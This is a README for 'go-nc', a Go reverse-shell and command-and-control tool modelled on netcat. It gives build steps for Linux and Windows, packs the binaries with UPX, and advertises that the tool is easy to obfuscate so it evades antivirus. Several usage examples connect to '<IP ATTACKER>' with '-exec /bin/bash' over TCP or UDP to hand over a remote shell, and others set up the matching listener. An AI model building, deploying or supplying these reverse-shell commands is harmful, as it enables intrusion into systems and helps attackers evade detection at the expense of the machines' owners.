# go-nc
Simple Command & Control for revshells in pure Go (Like a Netcat)

# Why?
The project is based on two repositories, which I unify and modify according to the use that is given to hacking. The idea of this project is to quickly and easily compile a multipurpose binary for different platforms and architectures. The advantage of this project is that it is easily obfuscable to evade antivirus, example: https://twitter.com/vay3t/status/1415547032719273984

Note: I asked the gonc project owner to include the -exec functionality to his project. As I am a bit impatient, I ended up doing it my way and it managed to remain functional.

Project based on:
* https://github.com/LukeDSchenk/go-backdoors
* https://github.com/dddpaul/gonc/


# Build

### For Linux
```bash
git clone https://github.com/vay3t/go-nc
cd go-nc
go build -ldflags "-s -w" go-nc.go
upx go-nc
```

```
-rwxr-xr-x 1 vay3t vay3t 685K Jul 15 00:21 go-nc
```

### For Windows
```bash
git clone https://github.com/vay3t/go-nc
cd go-nc
GOOS=windows GOARCH=amd64 go build -ldflags "-s -w" go-nc.go
upx go-nc.exe
```

```
-rwxr-xr-x 1 vay3t vay3t 825K Jul 15 00:30 go-nc.exe
```

# Usage

## Help
```
Usage of ./go-nc:
  -exec string
        command to execute
  -host string
        host to connect to
  -listen
        listen for incoming connections
  -port int
        port to connect to (default 4444)
  -proto string
        protocol to use (default "tcp")
```

## Examples

### Client

* Connect to attacker in port 4444/TCP with shell

```bash
./go-nc -host <IP ATTACKER> -exec /bin/bash
```

* Connect to attacker in port 5353/UDP with shell

```bash
./go-nc -host <IP ATTACKER> -port 5353 -proto udp -exec /bin/bash
```

* Connect to attacker in port 4444/TCP without shell

```bash
./go-nc -host <IP ATTACKER>
```

* Connect to attacker in port 5353/UDP without shell

```bash
./go-nc -host <IP ATTACKER> -port 5353 -proto udp
```

### Server

* Open port 4444/TCP in Listen mode

```bash
./go-nc -listen
```

* Open port 5353/UDP in Listen mode

```bash
./go-nc -listen -port 5353 -proto udp
```